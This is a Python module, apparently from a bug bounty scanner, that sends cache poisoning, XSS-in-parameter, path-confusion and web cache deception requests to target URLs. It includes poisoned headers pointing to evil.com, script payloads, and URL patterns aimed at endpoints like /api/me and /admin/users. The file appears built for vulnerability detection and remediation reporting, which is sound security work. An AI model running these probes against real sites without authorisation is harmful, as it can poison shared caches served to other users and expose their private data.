#!/usr/bin/env python3
"""
Web Cache Poisoning & Static Extension Bypass Testing Module
===========================================================

Based on vulnerability diagrams showing:
1. Web Cache Poisoning Attack Flow - User → Cache → Origin Server
2. Static Extension Cache Bypass - GET /profile;a.js exploitation

This module detects cache-based vulnerabilities for bug bounty programs.
"""

import requests
import time
import random
import string
from urllib.parse import urlparse, urljoin
from colorama import Fore, Style
import hashlib

class WebCacheTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # Cache poisoning patterns from diagrams
        self.cache_poisoning_patterns = {
            'header_injection': [
                ('X-Forwarded-Host', 'evil.com'),
                ('X-Forwarded-Proto', 'http'),
                ('X-Original-URL', '/admin'),
                ('X-Rewrite-URL', '/admin'),
                ('Host', 'evil.com'),
                ('X-Host', 'evil.com'),
                ('X-Forwarded-Server', 'evil.com'),
                ('X-Forwarded-Prefix', '/admin'),
                ('X-Real-IP', '127.0.0.1')
            ],
            'parameter_pollution': [
                '?callback=alert(1337)',
                '?utm_source=<script>alert("XSS")</script>',
                '?lang=en&lang=<script>alert(1)</script>',
                '?debug=1&admin=true',
                '?cache_buster=<script>alert("CACHE_POISON")</script>',
                '?ref=<img src=x onerror=alert(1)>',
                '?source=javascript:alert(1)'
            ],
            'unkeyed_parameters': [
                'utm_content', 'utm_campaign', 'utm_source', 'utm_medium',
                'fbclid', 'gclid', 'ref', 'source', 'campaign',
                'debug', 'test', 'dev', 'staging', 'admin',
                'callback', 'jsonp', 'format', 'lang', 'locale'
            ]
        }
        
        # Static extension bypass patterns from diagram 2
        self.static_extension_bypasses = {
            'extensions': [
                '.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg',
                '.ico', '.woff', '.woff2', '.ttf', '.eot', '.pdf',
                '.txt', '.xml', '.json', '.csv', '.zip', '.tar.gz',
                '.mp4', '.mp3', '.avi', '.mov', '.wmv'
            ],
            'sensitive_paths': [
                '/profile', '/admin', '/dashboard', '/settings',
                '/api/user', '/api/admin', '/account', '/user',
                '/config', '/debug', '/status', '/health'
            ]
        }
        
        # Web Cache Deception patterns (different from cache poisoning)
        self.cache_deception_patterns = {
            'static_suffixes': [
                '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg',
                '.ico', '.woff', '.woff2', '.ttf', '.pdf', '.txt', '.xml'
            ],
            'path_confusion': [
                '/;', '/.', '/..;', '/index.html/', '/static/',
                '/assets/', '/public/', '/resources/', '/files/'
            ],
            'sensitive_endpoints': [
                '/api/me', '/api/profile', '/api/user', '/user/profile',
                '/admin/profile', '/account/details', '/settings/personal',
                '/dashboard/data', '/api/orders', '/api/transactions',
                '/user/documents', '/admin/users', '/api/admin/config'
            ],
            'deception_techniques': [
                ('path_confusion', '/{endpoint}/{static}'),
                ('parameter_suffix', '{endpoint}?file=test{ext}'),
                ('extension_append', '{endpoint}{ext}'),
                ('directory_traversal', '{endpoint}/../static{ext}'),
                ('encoded_bypass', '{endpoint}%2F{static}')
            ]
        }
        
        self.cache_headers = [
            'Cache-Control', 'Expires', 'ETag', 'Last-Modified',
            'Vary', 'Age', 'X-Cache', 'X-Cache-Status',
            'CF-Cache-Status', 'X-Served-By', 'X-Cache-Hits',
            'X-Varnish', 'X-Fastly-Request-ID'
        ]

    def test_web_cache_vulnerabilities(self, targets):
        """Main entry point for web cache vulnerability testing"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"🔄 WEB CACHE POISONING DETECTION")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        for target in targets:
            if isinstance(target, dict):
                url = target.get('url', target.get('subdomain', ''))
            else:
                url = target
            
            if not url.startswith(('http://', 'https://')):
                url = f"https://{url}"
            
            print(f"\n{Fore.CYAN}[*] Testing cache vulnerabilities on: {url}{Style.RESET_ALL}")
            
            target_vulns = []
            
            # Test 1: Cache Poisoning via Header Injection
            header_vulns = self.test_header_cache_poisoning(url)
            target_vulns.extend(header_vulns)
            
            # Test 2: Parameter Pollution Cache Poisoning
            param_vulns = self.test_parameter_cache_poisoning(url)
            target_vulns.extend(param_vulns)
            
            # Test 3: Static Extension Cache Bypass (from diagram)
            static_vulns = self.test_static_extension_bypass(url)
            target_vulns.extend(static_vulns)
            
            # Test 4: Unkeyed Parameter Cache Poisoning
            unkeyed_vulns = self.test_unkeyed_parameter_poisoning(url)
            target_vulns.extend(unkeyed_vulns)
            
            # Test 5: Cache Key Confusion
            confusion_vulns = self.test_cache_key_confusion(url)
            target_vulns.extend(confusion_vulns)
            
            # Test 6: Web Cache Deception (NEW - PortSwigger research)
            deception_vulns = self.test_web_cache_deception(url)
            target_vulns.extend(deception_vulns)
            
            if target_vulns:
                print(f"{Fore.RED}[!] Found {len(target_vulns)} cache vulnerabilities on {url}{Style.RESET_ALL}")
                all_vulnerabilities.extend(target_vulns)
            else:
                print(f"{Fore.GREEN}[+] No cache vulnerabilities detected on {url}{Style.RESET_ALL}")
        
        return all_vulnerabilities

    def test_header_cache_poisoning(self, base_url):
        """Test cache poisoning via header injection (Diagram 1 pattern)"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing header injection cache poisoning...{Style.RESET_ALL}")
        
        for header_name, header_value in self.cache_poisoning_patterns['header_injection']:
            try:
                # Generate unique marker for this test
                unique_marker = self.generate_unique_marker()
                poisoned_value = f"{header_value}-{unique_marker}"
                
                # Step 1: Send poisoning request
                poison_headers = {
                    header_name: poisoned_value,
                    'User-Agent': 'zeroHack-CacheTester/1.0'
                }
                
                print(f"    {Fore.CYAN}[*] Testing {header_name}: {poisoned_value}{Style.RESET_ALL}")
                
                response1 = requests.get(base_url, headers=poison_headers, timeout=self.timeout)
                time.sleep(0.5)  # Allow cache to update
                
                # Step 2: Send clean request to check if cache is poisoned
                clean_headers = {'User-Agent': 'zeroHack-CacheTester-Clean/1.0'}
                response2 = requests.get(base_url, headers=clean_headers, timeout=self.timeout)
                
                # Check if poisoned content appears in clean response
                if self.is_cache_poisoned(response1, response2, unique_marker, poisoned_value):
                    vulnerabilities.append({
                        'type': 'Cache Poisoning - Header Injection',
                        'severity': 'High',
                        'url': base_url,
                        'method': 'GET',
                        'parameter': header_name,
                        'payload': poisoned_value,
                        'evidence': f'Poisoned header value reflected in cached response',
                        'impact': 'Attacker can serve malicious content to all users via cache',
                        'remediation': 'Exclude unvalidated headers from cache key or validate header values',
                        'cwe': 'CWE-444'
                    })
                    
                    print(f"    {Fore.RED}[!] VULNERABLE: Cache poisoning via {header_name}{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"    {Fore.RED}[!] Error testing {header_name}: {str(e)[:50]}...{Style.RESET_ALL}")
        
        return vulnerabilities

    def test_static_extension_bypass(self, base_url):
        """Test static extension cache bypass (Diagram 2: GET /profile;a.js)"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing static extension cache bypass...{Style.RESET_ALL}")
        
        for sensitive_path in self.static_extension_bypasses['sensitive_paths']:
            for extension in self.static_extension_bypasses['extensions']:
                try:
                    # Create bypass URL like /profile;a.js from diagram
                    bypass_url = urljoin(base_url, f"{sensitive_path};cache_bypass{extension}")
                    normal_url = urljoin(base_url, sensitive_path)
                    
                    print(f"    {Fore.CYAN}[*] Testing: {sensitive_path};cache_bypass{extension}{Style.RESET_ALL}")
                    
                    # Test bypass request
                    bypass_response = requests.get(bypass_url, timeout=self.timeout)
                    
                    # Compare with normal request
                    try:
                        normal_response = requests.get(normal_url, timeout=self.timeout)
                    except:
                        normal_response = None
                    
                    # Check if bypass reveals sensitive content
                    if self.is_static_extension_vulnerable(bypass_response, normal_response, sensitive_path):
                        vulnerabilities.append({
                            'type': 'Static Extension Cache Bypass',
                            'severity': 'High',
                            'url': bypass_url,
                            'method': 'GET',
                            'parameter': f'path;extension',
                            'payload': f'{sensitive_path};cache_bypass{extension}',
                            'evidence': f'Static extension bypass reveals sensitive content',
                            'impact': 'Attacker can access cached sensitive data via static extension confusion',
                            'remediation': 'Properly configure cache to handle path parameters and extensions',
                            'cwe': 'CWE-639'
                        })
                        
                        print(f"        {Fore.RED}[!] VULNERABLE: {bypass_url}{Style.RESET_ALL}")
                        break  # Found vulnerability, no need to test more extensions for this path
                        
                except Exception as e:
                    continue  # Skip this combination
        
        return vulnerabilities

    def test_parameter_cache_poisoning(self, base_url):
        """Test parameter pollution cache poisoning"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing parameter pollution cache poisoning...{Style.RESET_ALL}")
        
        for param_payload in self.cache_poisoning_patterns['parameter_pollution']:
            try:
                unique_marker = self.generate_unique_marker()
                poisoned_payload = param_payload.replace('alert(1337)', f'alert("{unique_marker}")')
                
                poison_url = base_url + poisoned_payload
                
                print(f"    {Fore.CYAN}[*] Testing: {poisoned_payload}{Style.RESET_ALL}")
                
                # Send poisoning request
                response1 = requests.get(poison_url, timeout=self.timeout)
                time.sleep(0.5)
                
                # Send clean request
                response2 = requests.get(base_url, timeout=self.timeout)
                
                if self.is_cache_poisoned(response1, response2, unique_marker, poisoned_payload):
                    vulnerabilities.append({
                        'type': 'Cache Poisoning - Parameter Pollution',
                        'severity': 'High',
                        'url': poison_url,
                        'method': 'GET',
                        'parameter': 'query_string',
                        'payload': poisoned_payload,
                        'evidence': f'Poisoned parameter reflected in cached response',
                        'impact': 'XSS via cache poisoning affects all users',
                        'remediation': 'Include all parameters in cache key or sanitize parameter values',
                        'cwe': 'CWE-444'
                    })
                    
                    print(f"    {Fore.RED}[!] VULNERABLE: Parameter pollution cache poisoning{Style.RESET_ALL}")
                
            except Exception as e:
                continue
        
        return vulnerabilities

    def test_unkeyed_parameter_poisoning(self, base_url):
        """Test unkeyed parameter cache poisoning"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing unkeyed parameter poisoning...{Style.RESET_ALL}")
        
        for param_name in self.cache_poisoning_patterns['unkeyed_parameters']:
            try:
                unique_marker = self.generate_unique_marker()
                xss_payload = f'<script>alert("{unique_marker}")</script>'
                
                poison_url = f"{base_url}?{param_name}={xss_payload}"
                
                print(f"    {Fore.CYAN}[*] Testing unkeyed parameter: {param_name}{Style.RESET_ALL}")
                
                # Send poisoning request
                response1 = requests.get(poison_url, timeout=self.timeout)
                time.sleep(0.5)
                
                # Send request without the parameter
                response2 = requests.get(base_url, timeout=self.timeout)
                
                if self.is_cache_poisoned(response1, response2, unique_marker, xss_payload):
                    vulnerabilities.append({
                        'type': 'Cache Poisoning - Unkeyed Parameter',
                        'severity': 'Critical',
                        'url': poison_url,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': xss_payload,
                        'evidence': f'Unkeyed parameter {param_name} causes cache poisoning',
                        'impact': 'XSS payload cached and served to all users',
                        'remediation': f'Include {param_name} parameter in cache key or validate/sanitize',
                        'cwe': 'CWE-444'
                    })
                    
                    print(f"    {Fore.RED}[!] CRITICAL: Unkeyed parameter {param_name} vulnerable{Style.RESET_ALL}")
                
            except Exception as e:
                continue
        
        return vulnerabilities

    def test_cache_key_confusion(self, base_url):
        """Test cache key confusion vulnerabilities"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing cache key confusion...{Style.RESET_ALL}")
        
        confusion_tests = [
            # HTTP vs HTTPS confusion
            (base_url.replace('https://', 'http://'), 'Protocol confusion'),
            # Port confusion
            (base_url + ':8080', 'Port confusion'),
            # Path normalization
            (base_url + '/../admin', 'Path traversal'),
            (base_url + '/./admin', 'Path normalization'),
            # Fragment confusion
            (base_url + '#admin', 'Fragment confusion')
        ]
        
        for test_url, test_type in confusion_tests:
            try:
                unique_marker = self.generate_unique_marker()
                
                print(f"    {Fore.CYAN}[*] Testing {test_type}: {test_url}{Style.RESET_ALL}")
                
                # Test if different URLs share same cache key
                response1 = requests.get(test_url, timeout=self.timeout)
                response2 = requests.get(base_url, timeout=self.timeout)
                
                if self.is_cache_shared(response1, response2):
                    vulnerabilities.append({
                        'type': f'Cache Key Confusion - {test_type}',
                        'severity': 'Medium',
                        'url': test_url,
                        'method': 'GET',
                        'parameter': 'url_structure',
                        'payload': test_url,
                        'evidence': f'{test_type} causes cache key collision',
                        'impact': 'Different URLs share same cache entry',
                        'remediation': 'Normalize URLs properly in cache key generation',
                        'cwe': 'CWE-639'
                    })
                    
                    print(f"    {Fore.RED}[!] VULNERABLE: {test_type}{Style.RESET_ALL}")
                
            except Exception as e:
                continue
        
        return vulnerabilities

    def is_cache_poisoned(self, poison_response, clean_response, marker, payload):
        """Check if cache poisoning was successful"""
        try:
            # Check if unique marker appears in clean response
            if marker in clean_response.text and marker not in poison_response.text:
                return True
            
            # Check if payload appears in clean response but not in poison response
            if payload in clean_response.text and payload not in poison_response.text:
                return True
            
            # Check cache headers for evidence
            if self.has_cache_evidence(poison_response, clean_response):
                return marker in clean_response.text
            
            return False
            
        except Exception:
            return False

    def is_static_extension_vulnerable(self, bypass_response, normal_response, path):
        """Check if static extension bypass reveals sensitive content"""
        try:
            if bypass_response.status_code != 200:
                return False
            
            # Look for sensitive content indicators
            sensitive_indicators = [
                'password', 'token', 'api_key', 'secret', 'admin',
                'profile', 'user_id', 'session', 'auth', 'private',
                'internal', 'config', 'database', 'sql', 'debug'
            ]
            
            content = bypass_response.text.lower()
            sensitive_count = sum(1 for indicator in sensitive_indicators if indicator in content)
            
            # If bypass response contains multiple sensitive indicators
            if sensitive_count >= 3:
                return True
            
            # Compare content length - significant difference might indicate different content
            if normal_response and abs(len(bypass_response.text) - len(normal_response.text)) > 1000:
                return sensitive_count >= 1
            
            return False
            
        except Exception:
            return False

    def is_cache_shared(self, response1, response2):
        """Check if two responses share the same cache entry"""
        try:
            # Compare ETags
            etag1 = response1.headers.get('ETag')
            etag2 = response2.headers.get('ETag')
            
            if etag1 and etag2 and etag1 == etag2:
                return True
            
            # Compare cache headers
            cache_headers = ['X-Cache', 'CF-Cache-Status', 'X-Served-By']
            for header in cache_headers:
                val1 = response1.headers.get(header)
                val2 = response2.headers.get(header)
                if val1 and val2 and val1 == val2 and 'HIT' in val1.upper():
                    return True
            
            return False
            
        except Exception:
            return False

    def has_cache_evidence(self, response1, response2):
        """Check if responses show evidence of caching"""
        cache_indicators = ['HIT', 'MISS', 'EXPIRED', 'cloudflare', 'varnish', 'fastly']
        
        for response in [response1, response2]:
            for header_name, header_value in response.headers.items():
                if any(indicator.lower() in header_value.lower() for indicator in cache_indicators):
                    return True
        
        return False

    def generate_unique_marker(self):
        """Generate unique marker for testing"""
        random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        timestamp = str(int(time.time()))
        return f"zeroHack_{random_string}_{timestamp}"

    def test_web_cache_deception(self, base_url):
        """Test web cache deception vulnerabilities (PortSwigger research)"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing web cache deception attacks...{Style.RESET_ALL}")
        
        for endpoint in self.cache_deception_patterns['sensitive_endpoints']:
            for technique_name, pattern in self.cache_deception_patterns['deception_techniques']:
                for static_suffix in self.cache_deception_patterns['static_suffixes'][:5]:  # Test top 5
                    try:
                        # Build deception URL based on technique
                        if technique_name == 'path_confusion':
                            deception_url = base_url + pattern.format(
                                endpoint=endpoint, 
                                static='assets/style' + static_suffix
                            )
                        elif technique_name == 'parameter_suffix':
                            deception_url = base_url + pattern.format(
                                endpoint=endpoint,
                                ext=static_suffix
                            )
                        elif technique_name == 'extension_append':
                            deception_url = base_url + pattern.format(
                                endpoint=endpoint,
                                ext=static_suffix
                            )
                        elif technique_name == 'directory_traversal':
                            deception_url = base_url + pattern.format(
                                endpoint=endpoint,
                                ext=static_suffix
                            )
                        elif technique_name == 'encoded_bypass':
                            deception_url = base_url + pattern.format(
                                endpoint=endpoint,
                                static='static' + static_suffix
                            )
                        else:
                            continue
                        
                        print(f"    {Fore.CYAN}[*] Testing cache deception: {deception_url}{Style.RESET_ALL}")
                        
                        # Test deception request
                        deception_response = requests.get(
                            deception_url,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Test normal endpoint for comparison
                        normal_url = base_url + endpoint
                        normal_response = requests.get(
                            normal_url,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check if cache deception worked
                        if self.is_cache_deception_vulnerable(deception_response, normal_response, endpoint):
                            vuln = {
                                'type': 'Web Cache Deception',
                                'technique': technique_name,
                                'endpoint': endpoint,
                                'deception_url': deception_url,
                                'normal_url': normal_url,
                                'static_suffix': static_suffix,
                                'status_code': deception_response.status_code,
                                'content_length': len(deception_response.text),
                                'headers': dict(deception_response.headers),
                                'cache_headers': {k: v for k, v in deception_response.headers.items() 
                                                if k.lower() in [h.lower() for h in self.cache_headers]},
                                'severity': 'High',
                                'description': f'Web cache deception allows accessing sensitive endpoint {endpoint} via static cache rules',
                                'impact': 'Sensitive data exposure through cache manipulation',
                                'recommendation': 'Configure cache to properly validate content types and paths'
                            }
                            vulnerabilities.append(vuln)
                            
                            print(f"    {Fore.RED}[!] CACHE DECEPTION FOUND: {technique_name} on {endpoint}{Style.RESET_ALL}")
                            print(f"        Deception URL: {deception_url}")
                            print(f"        Response Size: {len(deception_response.text)} bytes")
                        
                        time.sleep(0.3)  # Rate limiting
                        
                    except Exception as e:
                        continue
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} cache deception vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No cache deception vulnerabilities detected{Style.RESET_ALL}")
        
        return vulnerabilities

    def is_cache_deception_vulnerable(self, deception_response, normal_response, endpoint):
        """Check if cache deception attack was successful"""
        try:
            # Check if deception response is successful and contains sensitive data
            if deception_response.status_code not in [200, 201]:
                return False
            
            # Look for cache headers indicating successful caching
            cache_indicators = ['HIT', 'CACHED', 'hit', 'cached', 'public']
            cache_evidence = False
            
            for header_name, header_value in deception_response.headers.items():
                if any(indicator in str(header_value) for indicator in cache_indicators):
                    cache_evidence = True
                    break
            
            # Check for sensitive content in deception response
            sensitive_keywords = [
                'user_id', 'email', 'profile', 'admin', 'token', 'api_key',
                'session', 'password', 'secret', 'private', 'internal',
                'config', 'database', 'auth', 'credential'
            ]
            
            content = deception_response.text.lower()
            sensitive_count = sum(1 for keyword in sensitive_keywords if keyword in content)
            
            # If we have cache evidence and sensitive content
            if cache_evidence and sensitive_count >= 2:
                return True
            
            # Compare with normal response - different content might indicate successful deception
            if normal_response and normal_response.status_code == 200:
                content_diff = abs(len(deception_response.text) - len(normal_response.text))
                if content_diff > 500 and sensitive_count >= 1:  # Significant content difference + some sensitive data
                    return True
            
            # Check for successful access to normally protected endpoint
            if deception_response.status_code == 200 and normal_response and normal_response.status_code in [401, 403, 404]:
                return True
            
            return False
            
        except Exception:
            return False